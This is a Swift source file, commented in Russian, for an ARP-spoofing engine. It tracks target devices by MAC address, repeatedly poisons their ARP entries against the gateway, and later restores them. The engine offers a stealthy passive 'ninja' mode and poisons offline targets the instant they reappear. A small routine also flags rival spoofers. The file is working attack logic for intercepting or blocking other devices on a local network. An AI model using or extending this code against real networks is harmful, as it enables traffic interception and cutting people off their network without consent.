import Foundation

/// Движок спуфинга для нескольких целей одновременно. Цели ключуются по MAC
/// (стабилен), текущий IP держится в связке `bindings` и обновляется из ARP.
/// Чистая логика без сокетов — переиспользуется CLI `serve` и будущим GUI-хелпером.
public final class SpoofEngine {
    public let spoofer: ARPSpoofer
    public let gatewayIP: IPv4Address
    public let gatewayMAC: MACAddress
    public var oneway: Bool
    /// В пассивном (ниндзя) режиме не рассылаем ARP-свип: цели и их появление
    /// ловим только по пассивно пришедшему ARP.
    public var passiveOnly = false

    public private(set) var bindings: [MACAddress: IPv4Address] = [:]
    public private(set) var active: Set<MACAddress> = []

    /// Вызывается, когда замечен ЧУЖОЙ ARP-спуфер: (атакующий MAC, подменяемый IP).
    public var onSpoofDetected: ((MACAddress, IPv4Address) -> Void)?
    private var reportedSpoofers = Set<MACAddress>()

    public init(spoofer: ARPSpoofer, gatewayIP: IPv4Address, gatewayMAC: MACAddress, oneway: Bool) {
        self.spoofer = spoofer
        self.gatewayIP = gatewayIP
        self.gatewayMAC = gatewayMAC
        self.oneway = oneway
        bindings[gatewayMAC] = gatewayIP
    }

    /// Обновить связку MAC→IP из ARP-кадра. Вернёт MAC, если IP реально изменился.
    @discardableResult
    public func ingest(_ frame: [UInt8]) -> MACAddress? {
        guard let (m, ip) = parseARPSender(frame) else { return nil }

        // Защита: кто-то ДРУГОЙ (не мы) выдаёт senderIP, прочно связанный у нас с
        // другим MAC — за шлюз или за нас → чужой ARP-спуфер в сети.
        if m != spoofer.iface.mac, !reportedSpoofers.contains(m) {
            let impersonatesGateway = (ip == gatewayIP && m != gatewayMAC)
            let impersonatesUs = (ip == spoofer.iface.ip)
            if impersonatesGateway || impersonatesUs {
                reportedSpoofers.insert(m)
                onSpoofDetected?(m, ip)
            }
        }

        if bindings[m] != ip { bindings[m] = ip; return m }
        return nil
    }

    /// Занести известную связку (например, из результатов scan).
    public func observe(_ host: Host) { bindings[host.mac] = host.ip }

    public func currentIP(of mac: MACAddress) -> IPv4Address? { bindings[mac] }

    public func start(_ mac: MACAddress) {
        // Защита: нельзя травить сам этот Mac (себя) или шлюз — иначе можно
        // отрезать себе сеть/маршрут. Эти цели игнорируются молча.
        guard mac != spoofer.iface.mac, mac != gatewayMAC else { return }
        active.insert(mac)
        // IP неизвестен (например, цель сейчас оффлайн — блок-на-появление):
        // в активном режиме разово подтолкнём ARP, в ниндзя ждём пассивно.
        if bindings[mac] == nil, !passiveOnly { spoofer.probeSubnet() }
    }

    public func stop(_ mac: MACAddress) {
        restore(mac)
        active.remove(mac)
    }

    public func stopAll() {
        for mac in active { restore(mac) }
        active.removeAll()
    }

    private func restore(_ mac: MACAddress) {
        guard let ip = bindings[mac] else { return }
        spoofer.restore(victimIP: ip, victimMAC: mac,
                        gatewayIP: gatewayIP, gatewayMAC: gatewayMAC, times: 3)
    }

    /// Один тик: отравить все активные цели с известным IP. Для целей без
    /// известного IP (оффлайн — блок-на-появление) НИЧЕГО не шлём и НЕ зондируем:
    /// их появление поймает ingest() по пассивно пришедшему ARP, и следующий тик
    /// начнёт травлю. Так блокировка срабатывает мгновенно и без шума.
    public func tick() {
        for mac in active {
            guard let ip = bindings[mac] else { continue }
            spoofer.poisonOnce(victimIP: ip, victimMAC: mac,
                               gatewayIP: gatewayIP, gatewayMAC: gatewayMAC, oneway: oneway)
        }
    }
}
